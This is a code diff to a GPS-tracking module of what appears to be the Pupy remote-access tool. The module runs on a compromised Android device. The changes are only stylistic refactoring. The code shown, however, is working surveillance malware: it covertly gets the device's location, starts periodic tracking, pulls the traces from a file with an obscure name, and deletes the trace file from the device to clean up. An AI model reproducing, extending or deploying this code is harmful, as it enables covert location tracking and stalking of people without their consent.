@@ -6,7 +6,8 @@ __class_name__="gpstracker"
 
 from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
 from time import sleep
-import os, csv
+import os
+import csv
 from rpyc.utils.classic import download
 from pupylib.utils.common import getLocalAndroidPath
 
@@ -64,7 +65,7 @@ def generateKML(deviceName, traces, outputFile):
     kmlData = KML_TEMPLATE.replace('MY_DOCUMENT', deviceName)
     kmlData = kmlData.replace('MY_DESCRIPTION', deviceName)
     for aPlace in traces:
-        if lastPlace == None:
+        if lastPlace is None:
             lastPlace = aPlace
 
         # logging.info("{0},{1} --> {2},{3}".format(lastPlace[1],lastPlace[2], aPlace[1], aPlace[2]))
@@ -105,14 +106,14 @@ class gpstracker(PupyModule):
         androidID = self.client.conn.modules['pupydroid.utils'].getAndroidID()
         self.localFolder = getLocalAndroidPath(localFolder=args.localOutputFolder, androidID=androidID, userName=self.client.desc['user'])
         gpsTracker = self.client.conn.modules['pupydroid.gpsTracker'].GpsTracker(period=args.period, inMemory=args.in_memory)
-        if args.is_GPS_enabled == True:
+        if args.is_GPS_enabled:
             self.success("Is GPS enabled?")
             print gpsTracker.isGPSenabled()
-        if args.is_network_rovider_enabled == True:
+        if args.is_network_rovider_enabled:
             self.success("Is Network Provider enabled?")
             print gpsTracker.isNetworkProviderEnabled()
-        if args.get_position == True:
-            if gpsTracker.isNetworkProviderEnabled() == False and gpsTracker.isGPSenabled()==False:
+        if args.get_position:
+            if not gpsTracker.isNetworkProviderEnabled() and not gpsTracker.isGPSenabled():
                 self.error("GPS or Network Provider is not enabled on the device. You should not be able to get location!")
                 return
             else:
@@ -122,7 +123,7 @@ class gpstracker(PupyModule):
             for nbRetry in range(3):
                 self.success("Getting current location...")
                 lat, lon = gpsTracker.getCurrentLocation()
-                if lat==None and lon==None:
+                if lat is None and lon is None:
                     self.error("Impossible to get location, retrying...")
                     sleep(5)
                 else:
@@ -131,21 +132,19 @@ class gpstracker(PupyModule):
                     break
             gpsTracker.disable()
         if args.start:
-            r = self.client.conn.modules["pupydroid.gpsTracker"].startGpsTracker(period=args.period)
-            if r == True:
+            if self.client.conn.modules["pupydroid.gpsTracker"].startGpsTracker(period=args.period):
                 self.success("Tracking enabled. Get GPS position each {0} secds".format(args.period))
             else:
                 self.error("Tracking not enabled because already activated")
         elif args.stop:
-             self.success("Stopping GPS tracking... (can take {0} secds)".format(args.period))
-             r = self.client.conn.modules["pupydroid.gpsTracker"].stopGpsTracker()
-             if r == True:
+            self.success("Stopping GPS tracking... (can take {0} secds)".format(args.period))
+            if self.client.conn.modules["pupydroid.gpsTracker"].stopGpsTracker():
                 self.success("Tracking stopped")
-             else:
+            else:
                 self.error("Tracking not stopped because not activated")
         elif args.dump:
             filename = os.path.join(self.localFolder,"gpsTraces.csv")
-            if args.in_memory==False:
+            if not args.in_memory:
                 traces = []
                 download(self.client.conn, "keflfjezomef.csv",filename)
                 self.success("GPS positions downloaded in {0}".format(filename))
@@ -156,7 +155,7 @@ class gpstracker(PupyModule):
                 traces = self.client.conn.modules["pupydroid.gpsTracker"].dumpGpsTracker()
             self.success("{0} GPS positions".format(len(traces)))
             if len(traces)>0:
-                if args.in_memory==True:
+                if args.in_memory:
                     f=open(filename,'w')
                     f.write("Date, Lat, Lon\n")
                     for aPos in traces:
@@ -169,13 +168,13 @@ class gpstracker(PupyModule):
             else:
                 self.error("No GPS positions get. You should start GPS tracking or wait a moment")
         elif args.status:
-            if self.client.conn.modules["pupydroid.gpsTracker"].statusGpsTracker() == True:
+            if self.client.conn.modules["pupydroid.gpsTracker"].statusGpsTracker():
                 self.success("GPS tracking is enabled")
             else:
                 self.success("GPS tracking is NOT enabled")
         elif args.clean:
             status = self.client.conn.modules["pupydroid.gpsTracker"].deleteFile()
-            if status == True:
+            if status:
                 self.success("Trace file deleted from device")
             else:
                 self.error("Impossible to delete trace file on device")
